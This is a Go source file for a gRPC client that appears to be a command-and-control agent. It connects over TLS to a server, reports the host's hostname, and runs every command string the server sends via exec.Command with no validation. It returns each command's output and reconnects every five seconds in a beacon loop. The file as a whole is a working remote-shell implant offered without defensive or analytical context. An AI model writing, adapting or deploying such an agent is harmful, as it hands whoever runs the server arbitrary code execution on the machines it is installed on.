package main

import (
	pb "client/pb/simple"
	"context"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/metadata"
)

func main() {
	var opts []grpc.DialOption
	tls, err := credentials.NewClientTLSFromFile("./ca-cert.crt", "crasite.com")
	if err != nil {
		log.Fatal(err)
	}

	opts = append(opts, grpc.WithTransportCredentials(tls))

	for {
		conn, err := grpc.Dial("localhost:10000", opts...)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		defer conn.Close()
		client := pb.NewSimpleClient(conn)
		runServerChat(client)
		time.Sleep(5 * time.Second)
	}
}

func runServerChat(client pb.SimpleClient) {
	hostname, err := os.Hostname()
	connMetadata := metadata.Pairs("hostname", hostname)
	ctx := metadata.NewOutgoingContext(context.Background(), connMetadata)
	stream, err := client.Default(ctx)
	if err != nil {
		log.Printf("client.RouteChat failed: %v", err)
		return
	}
	waitc := make(chan struct{})
	go func() {
		for {
			in, err := stream.Recv()
			if err == io.EOF {
				// read done.
				close(waitc)
				return
			}
			if err != nil {
				log.Printf("client.RouteChat failed: %v", err)
				close(waitc)
				return
			}
			log.Printf("Got Question %v with (%v)", in.Question, in.ExtraText)
			cmd_args := strings.Split(in.ExtraText, " ")
			cmd := exec.Command(cmd_args[0], cmd_args[1:]...)
			output, err := cmd.Output()
			if err != nil {
				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: err.Error()}})
			} else {
				stream.Send(&pb.Client{Request: &pb.Client_Response{Response: string(output)}})
			}
		}
	}()
	// for _, note := range notes {
	// 	if err := stream.Send(note); err != nil {
	// 		log.Fatalf("client.RouteChat: stream.Send(%v) failed: %v", note, err)
	// 	}
	// }
	<-waitc
}
